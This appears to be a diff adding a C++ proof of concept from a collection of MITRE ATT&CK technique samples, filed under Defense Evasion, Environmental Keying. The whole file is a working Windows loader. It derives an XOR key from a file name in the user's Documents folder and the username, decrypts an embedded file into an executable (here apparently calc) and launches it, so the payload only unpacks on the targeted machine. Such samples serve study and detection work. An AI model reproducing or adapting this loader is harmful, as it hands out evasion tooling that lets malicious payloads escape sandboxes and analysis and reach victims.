@@ -1,0 +1,86 @@
+---
+title: "deszyfrator"
+folder: "07. Defense Evasion/T1480.001.Environmental Keying"
+---
+
+
+#include <string>
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <filesystem>
+
+void decryptFile(const std::string& inputFile, const std::string& outputFile, const std::string& password) {
+    std::ifstream in(inputFile, std::ios::binary);
+    std::ofstream out(outputFile, std::ios::binary);
+
+    size_t passwordIndex = 0;
+
+    char byte;
+    while (in.get(byte)) {
+        byte ^= password.at(passwordIndex);
+        passwordIndex = (passwordIndex + 1) % password.size();
+
+        out.put(byte);
+    }
+
+    in.close();
+    out.close();
+}
+
+std::string generatePassword() {
+
+
+    std::wstring password;
+
+    WIN32_FIND_DATAW findFileData;
+    HANDLE hFind = FindFirstFileW(L"C:\\Users\\User\\Documents\\wa*.*", &findFileData);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do { 
+            password = findFileData.cFileName;
+            if (password.size() > 0 && password[0] == L'W') {
+                password = password.substr(0, password.find(L'.'));
+                break;
+            }
+        } while (FindNextFileW(hFind, &findFileData) != 0);
+
+        FindClose(hFind);
+    }
+
+    WCHAR username[MAX_PATH];
+    DWORD usernameLength = MAX_PATH;
+    GetUserNameW(username, &usernameLength);
+
+    password += std::wstring(username);
+
+    return std::string(password.begin(), password.end());
+}
+
+void savePasswordToFile(const std::string& password) {
+    std::ofstream outputFile("password.txt");
+    if (outputFile.is_open()) {
+        outputFile << password;
+        outputFile.close();
+        std::cout << "Hasło zostało zapisane do pliku password.txt." << std::endl;
+    }
+    else {
+        std::cerr << "Nie można otworzyć pliku do zapisu." << std::endl;
+    }
+}
+
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    std::string password = generatePassword();
+
+    const std::string encryptedFile = "plik.txt";
+    const std::string decryptedFile = "calc_decrypted.exe";
+
+    decryptFile(encryptedFile, decryptedFile, password);
+
+    savePasswordToFile(password);
+    // Uruchamiamy odszyfrowany plik
+    ShellExecuteA(NULL, "open", decryptedFile.c_str(), NULL, NULL, SW_SHOWNORMAL);
+
+    return 0;
+}
